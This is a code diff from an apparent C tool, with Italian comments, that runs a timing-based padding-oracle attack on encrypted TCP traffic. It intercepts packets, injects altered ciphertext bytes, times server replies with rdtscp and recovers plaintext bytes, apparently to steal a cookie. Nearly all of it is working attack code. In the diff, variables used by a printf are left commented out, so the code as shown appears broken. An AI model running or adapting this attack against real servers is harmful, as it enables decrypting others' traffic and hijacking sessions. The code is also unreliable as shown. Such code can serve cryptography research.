@@ -36,12 +36,16 @@ void intercept_packets();
 static inline struct iphdr *extract_ip_header(Byte *payload, unsigned int payload_len);
 static inline struct tcphdr *extract_tcp_header(Byte *payload, unsigned int payload_len, unsigned int iphdr_len);
 static inline Byte *extract_application_data(Byte *payload, unsigned int payload_len, unsigned int iphdr_size, unsigned int tcphdr_size);
-
 void *do_attack_thread(void *arg);
-
 static int packet_verdict_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data);
-
 void stampa_cookie();
+
+static inline uint64_t rdtsc() {
+  unsigned int lo, hi, aux;
+  __asm__ __volatile__ ("rdtscp" : "=a"(lo), "=d"(hi), "=c"(aux));
+  return ((uint64_t)hi << 32) | lo;
+}
+
 
 char *active_interface;
 Data_packet *data_packet;
@@ -520,7 +524,7 @@ unsigned short recalculate_checksum(){
 }
 
 //function to send the modified packet to the server
-void send_modified_packet(struct timespec *start){
+void send_modified_packet(uint64_t *start){
   int smp_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
   int hincl = 1;
   int mark = 1;
@@ -554,7 +558,9 @@ void send_modified_packet(struct timespec *start){
 
   //printf("ho creato l'indirizzo ora spedisco il pacchetto al server! \n");
 
-  clock_gettime(CLOCK_MONOTONIC_RAW, start);
+
+  //DA CAMBIARE
+  *start = rdtsc();
   sendto(smp_fd, raw_packet, total_packet_length,0, (struct sockaddr *)&server_addr, sizeof(server_addr));
 
   //printf("pacchetto mandato al server! \n");
@@ -569,7 +575,7 @@ void *do_attack_thread(void *arg){
   struct timespec start;
   char *server_interface = get_server_interface(ip_server, port_server);
   bool first_attack = true;
-  int n_attemps = 0;
+  unsigned long long n_attemps = 0;
   struct first_attack_result *fa_result = calloc(1, sizeof(struct first_attack_result));
   struct attack_result *a_result = calloc(1, sizeof(struct attack_result));
   Byte expected_padding = 0x01; 
@@ -629,36 +635,21 @@ void *do_attack_thread(void *arg){
    
     flush_pcap_buffer(pcap_handle);
          
-    send_modified_packet(&start);
+    uint64_t start_cycles;
+    send_modified_packet(&start_cycles);
+    uint64_t stop_cycles =  get_server_response_time(pcap_handle, start_cycles);
 
-    struct timespec stop = get_server_response_time(pcap_handle, start);;
-
-    if(stop.tv_sec == 0 && stop.tv_nsec == 0){
+    if(stop_cycles == 0){
       printf("Server didn't reply \n");
       attack = false;
       continue;
     }
 
+    long long delta = stop_cycles - start_cycles;
 
-    long long resp_nanosec = ((long long)stop.tv_sec * 1000000000LL) + stop.tv_nsec;
-    long long send_nanosec = ((long long)start.tv_sec * 1000000000LL) + start.tv_nsec;
-    long long delta = resp_nanosec - send_nanosec;
-
-    /*
-    long resp_microsec = (stop.tv_sec * 1000000) + (stop.tv_nsec / 1000);
-    printf("valore di resp_microsec: %lu \n", resp_microsec);
-    long send_microsec = (start.tv_sec * 1000000) + (start.tv_nsec / 1000);
-    printf("valore di send_microsec: %lu \n", send_microsec); 
-    long delta = resp_microsec - send_microsec;   */
-
-    printf("Reply delta time: %lu \n", delta);
+    printf("Reply delta time: %llu \n", delta);
 
     //write the reply time inside the struct
-
-    //if n_attemps == L_SIZE * 256 * 256 && first_attack (in first attack) call analyze_double_bytes(struct first_attack *result) function
-      //then set n_attemps == 0 and first_attack = false
-    //n_attemps / 256 = L (column for meas matrix)
-    //n_attemps - 256 * L = byte (row for meas matrix)
 
     int column, row;
    
@@ -668,7 +659,7 @@ void *do_attack_thread(void *arg){
       fa_result->time_meas[row][column] = (int64_t)delta;
       n_attemps++;
 
-      if(n_attemps == (L_SIZE * 256 * 256)){
+      if(n_attemps == ((unsigned long long)L_SIZE * 256 * 256)){
         n_attemps = 0;
         first_attack = false;
 
@@ -691,23 +682,26 @@ void *do_attack_thread(void *arg){
 
         printf("Valore del penultimo byte: 0x%02x", guessed_penultimate);
         printf("Valore dell'ultimo byte: 0x%02x", guessed_last);
-        //Byte plain_penultimate = expected_padding ^ guessed_penultimate ^ original_ciph_penultimate;
-        //Byte plain_last = expected_padding ^ guessed_last ^ original_ciph_last;
+
+        Byte plain_penultimate = expected_padding ^ guessed_penultimate ^ original_ciph_penultimate;
+        Byte plain_last = expected_padding ^ guessed_last ^ original_ciph_last;
         
-        //printf("Plaintext Penultimo: 0x%02x (ASCII: %c)\n", plain_penultimate, plain_penultimate);
-        //printf("Plaintext Ultimo:    0x%02x (ASCII: %c)\n", plain_last, plain_last);
+        printf("Plaintext Penultimo: 0x%02x (ASCII: %c)\n", plain_penultimate, plain_penultimate);
+        printf("Plaintext Ultimo:    0x%02x (ASCII: %c)\n", plain_last, plain_last);
 
         /*DEBUGGING
           so che gli ultimi 2 byte del plaintext sono 0x38 (8) e 0x39 (9)
           per ottenere 0x01 0x01 so che i byte che devo iniettare sono
         */
-
+       
         /*
         Byte expected_last_byte = 0x01 ^ 0x39 ^ original_ciph_last;
-        Byte expcted_penultime_byte = 0x01 ^ 0x038 ^ original_ciph_penultimate; */
+        Byte expcted_penultime_byte = 0x01 ^ 0x038 ^ original_ciph_penultimate; 
+        */
 
+        /*
         Byte expected_last_byte = 0x39;
-        Byte expected_penultimate_byte = 0x38;
+        Byte expected_penultimate_byte = 0x38; */
 
         printf("I byte che l'analisi statistica deve scegliere sono: \n last_byte: 0x%02x \n penultimate_byte: 0x%02x \n ", expected_last_byte, expected_penultimate_byte);
         
